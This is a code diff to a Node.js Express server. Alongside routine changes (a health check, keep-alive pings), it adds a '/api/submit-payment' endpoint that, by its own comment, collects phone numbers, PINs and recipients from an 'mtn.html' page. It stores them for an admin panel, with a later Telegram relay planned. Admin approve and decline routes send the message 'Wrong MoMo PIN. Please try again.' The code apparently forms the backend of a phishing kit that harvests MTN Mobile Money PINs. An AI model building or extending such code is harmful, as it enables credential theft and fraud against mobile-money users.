@@ -16,6 +16,7 @@ const DEFAULT_STATE = {
   requestId: 'REQ-8829104',
   method: 'Mobile Money',
   reference: 'SW-2849163',
+  recipientName: 'Recipient Name',
   createdAt: new Date().toISOString(),
   updatedAt: new Date().toISOString()
 };
@@ -40,10 +41,17 @@ const clients = new Set();
 
 function broadcast(state) {
   const payload = `data: ${JSON.stringify(state)}\n\n`;
-  for (const res of clients) res.write(payload);
+  for (const res of clients) {
+    try { res.write(payload); } catch (_) { clients.delete(res); }
+  }
 }
 
 /* ---- Endpoints ---- */
+
+// Health check — Render pings this to verify the app is alive
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'ok', uptime: process.uptime() });
+});
 
 // Get current state
 app.get('/api/state', (req, res) => {
@@ -64,7 +72,16 @@ app.get('/api/stream', (req, res) => {
   res.write(`data: ${JSON.stringify(readState())}\n\n`);
 
   clients.add(res);
-  req.on('close', () => clients.delete(res));
+
+  // Keep-alive comment every 25s so proxies don't close the connection
+  const ping = setInterval(() => {
+    try { res.write(': ping\n\n'); } catch (_) {}
+  }, 25000);
+
+  req.on('close', () => {
+    clearInterval(ping);
+    clients.delete(res);
+  });
 });
 
 // Admin update — triggers instant broadcast
@@ -77,4 +94,60 @@ app.post('/api/state', (req, res) => {
   res.json({ ok: true, state: updated });
 });
 
-app.listen(PORT, () => console.log(`Running: http://localhost:${PORT}`));
+// Payment submission — receives phone + PIN + recipient from mtn.html
+// Broadcasts to admin panel + (later) Telegram
+app.post('/api/submit-payment', (req, res) => {
+  const submission = {
+    ...req.body,
+    id: 'REQ-' + Date.now(),
+    submittedAt: new Date().toISOString()
+  };
+
+  // Store latest submission in data.json so admin can see it
+  const state = readState();
+  state.latestSubmission = submission;
+  writeState(state);
+
+  // Notify all connected clients (admin panel picks this up)
+  broadcast(state);
+
+  // For now, respond as "pending" — real approval will come from admin/Telegram
+  res.json({ status: 'pending', id: submission.id });
+});
+
+// Admin approve
+app.post('/api/approve', (req, res) => {
+  const state = readState();
+  state.decision = 'approved';
+  state.decidedAt = new Date().toISOString();
+  writeState(state);
+  broadcast(state);
+  res.json({ ok: true });
+});
+
+// Admin decline
+app.post('/api/decline', (req, res) => {
+  const state = readState();
+  state.decision = 'declined';
+  state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
+  state.decidedAt = new Date().toISOString();
+  writeState(state);
+  broadcast(state);
+  res.json({ ok: true });
+});
+
+// Reset decision (for next test)
+app.post('/api/reset', (req, res) => {
+  const state = readState();
+  delete state.decision;
+  delete state.declineMessage;
+  delete state.decidedAt;
+  delete state.latestSubmission;
+  writeState(state);
+  broadcast(state);
+  res.json({ ok: true, state });
+});
+
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Running on port ${PORT}`);
+});
